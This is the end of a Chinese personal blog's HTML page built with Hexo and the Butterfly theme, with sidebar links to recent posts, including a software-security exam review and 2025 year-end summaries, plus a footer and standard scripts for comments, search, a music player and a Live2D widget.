title="软件安全期末复习">软件安全期末复习</a><time datetime="2026-01-06T05:00:00.000Z" title="发表于 2026-01-06 13:00:00">2026-01-06</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/2025/12/31/2025%E5%B9%B4%E5%BA%A6%E6%80%BB%E7%BB%93%E4%B8%8B/" title="2025年度下半年总结"><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/img/2025.jpg" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="2025年度下半年总结"/></a><div class="content"><a class="title" href="/2025/12/31/2025%E5%B9%B4%E5%BA%A6%E6%80%BB%E7%BB%93%E4%B8%8B/" title="2025年度下半年总结">2025年度下半年总结</a><time datetime="2025-12-31T07:00:00.000Z" title="发表于 2025-12-31 15:00:00">2025-12-31</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/2025/12/31/2025%E5%B9%B4%E5%BA%A6%E6%80%BB%E7%BB%93%E4%B8%8A/" title="2025年度上半年总结"><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/img/2025.jpg" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="2025年度上半年总结"/></a><div class="content"><a class="title" href="/2025/12/31/2025%E5%B9%B4%E5%BA%A6%E6%80%BB%E7%BB%93%E4%B8%8A/" title="2025年度上半年总结">2025年度上半年总结</a><time datetime="2025-12-31T05:00:00.000Z" title="发表于 2025-12-31 13:00:00">2025-12-31</time></div></div></div></div></div></div></main><footer id="footer"><div class="footer-other"><div class="footer-copyright"><span class="copyright">&copy;&nbsp;2025 - 2026 By Harrisonls2004</span><span class="framework-info"><span>框架 </span><a target="_blank" rel="noopener" href="https://hexo.io">Hexo 7.3.0</a><span class="footer-separator">|</span><span>主题 </span><a target="_blank" rel="noopener" href="https://github.com/jerryc127/hexo-theme-butterfly">Butterfly 5.5.4-b1</a></span></div><div class="footer_custom_text">尽人事 听天命</div></div></footer></div><div id="rightside"><div id="rightside-config-hide"><button id="readmode" type="button" title="阅读模式"><i class="fas fa-book-open"></i></button><button id="translateLink" type="button" title="简繁转换">繁</button><button id="darkmode" type="button" title="日间和夜间模式切换"><i class="fas fa-adjust"></i></button><button id="hide-aside-btn" type="button" title="单栏和双栏切换"><i class="fas fa-arrows-alt-h"></i></button></div><div id="rightside-config-show"><button id="rightside-config" type="button" title="设置"><i class="fas fa-cog fa-spin"></i></button><button class="close" id="mobile-toc-button" type="button" title="目录"><i class="fas fa-list-ul"></i></button><a id="to_comment" href="#post-comment" title="前往评论"><i class="fas fa-comments"></i></a><button id="go-up" type="button" title="回到顶部"><span class="scroll-percent"></span><i class="fas fa-arrow-up"></i></button></div></div><div><script src="/js/utils.js?v=5.5.4-b1"></script><script src="/js/main.js?v=5.5.4-b1"></script><script src="/js/tw_cn.js?v=5.5.4-b1"></script><script src="https://cdn.jsdelivr.net/npm/@fancyapps/ui@6.1.7/dist/fancybox/fancybox.umd.min.js"></script><script src="https://cdn.jsdelivr.net/npm/vanilla-lazyload@19.1.3/dist/lazyload.iife.min.js"></script><script src="https://cdn.jsdelivr.net/npm/node-snackbar@0.1.16/dist/snackbar.min.js"></script><div class="js-pjax"><script>(() => {
  let initFn = window.walineFn || null
  const isShuoshuo = GLOBAL_CONFIG_SITE.pageType === 'shuoshuo'
  const option = {"lang":"zh-CN","locale":{"placeholder":"开始你的表演，请文明发言哦！"},"emoji":["https://unpkg.com/@waline/emojis@1.2.0/weibo","https://unpkg.com/@waline/emojis@1.2.0/alus","https://unpkg.com/@waline/emojis@1.2.0/bilibili"],"meta":["nick","mail","link"],"requiredMeta":[],"wordLimit":500,"pageSize":10,"avatar":"monsterid","avatarCDN":"https://sdn.geekzu.org/avatar/","avatarForce":false,"highlight":true,"mathTagSupport":true,"commentSorting":"latest"}

  const destroyWaline = ele => ele.destroy()

  const initWaline = (Fn, el = document, path = window.location.pathname) => {
    const waline = Fn({
      el: el.querySelector('#waline-wrap'),
      serverURL: 'https://waline-chi-beryl.vercel.app',
      pageview: true,
      dark: 'html[data-theme="dark"]',
      comment: true,
      ...option,
      path: isShuoshuo ? path : (option && option.path) || path
    })

    if (isShuoshuo) {
      window.shuoshuoComment.destroyWaline = () => {
        destroyWaline(waline)
        if (el.children.length) {
          el.innerHTML = ''
          el.classList.add('no-comment')
        }
      }
    }
  }

  const loadWaline = (el, path) => {
    if (initFn) initWaline(initFn, el, path)
    else {
      btf.getCSS('https://cdn.jsdelivr.net/npm/@waline/client@3.8.0/dist/waline.min.css')
        .then(() => import('https://cdn.jsdelivr.net/npm/@waline/client@3.8.0/dist/waline.min.js'))
        .then(({ init }) => {
          initFn = init || Waline.init
          initWaline(initFn, el, path)
          window.walineFn = initFn
        })
    }
  }

  if (isShuoshuo) {
    'Waline' === 'Waline'
      ? window.shuoshuoComment = { loadComment: loadWaline } 
      : window.loadOtherComment = loadWaline
    return
  }

  if ('Waline' === 'Waline' || !false) {
    if (false) btf.loadComment(document.getElementById('waline-wrap'),loadWaline)
    else setTimeout(loadWaline, 0)
  } else {
    window.loadOtherComment = loadWaline
  }
})()</script></div><script src="/js/click-heart.js"></script><script src="/js/sakura.js"></script><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/aplayer@1.10.1/dist/APlayer.min.css" media="print" onload="this.media='all'"><script src="https://cdn.jsdelivr.net/npm/aplayer@1.10.1/dist/APlayer.min.js"></script><script src="https://cdn.jsdelivr.net/npm/butterfly-extsrc@1.1.6/metingjs/dist/Meting.min.js"></script><div id="local-search"><div class="search-dialog"><nav class="search-nav"><span class="search-dialog-title">搜索</span><i class="fas fa-spinner fa-pulse" id="loading-status" hidden="hidden"></i><button class="search-close-button"><i class="fas fa-times"></i></button></nav><div class="text-center" id="loading-database"><i class="fas fa-spinner fa-pulse"></i><span>  数据加载中</span></div><div class="local-search-input"><input placeholder="搜索文章..." type="text"/></div><hr/><div id="local-search-results"></div><div class="ais-Pagination" id="local-search-pagination" style="display:none;"><ul class="ais-Pagination-list"></ul></div><div id="local-search-stats"></div></div><div id="search-mask"></div><script src="/js/search/local-search.js?v=5.5.4-b1"></script></div></div><script src="/live2dw/lib/L2Dwidget.min.js?094cbace49a39548bed64abff5988b05"></script><script>L2Dwidget.init({"pluginRootPath":"live2dw/","pluginJsPath":"lib/","pluginModelPath":"assets/","tagMode":false,"debug":false,"model":{"jsonPath":"/live2dw/assets/wanko.model.json"},"display":{"position":"right","width":150,"height":300,"hOffset":0,"vOffset":-20},"mobile":{"show":true,"scale":0.5},"react":{"opacity":0.7},"log":false});</script></body></html>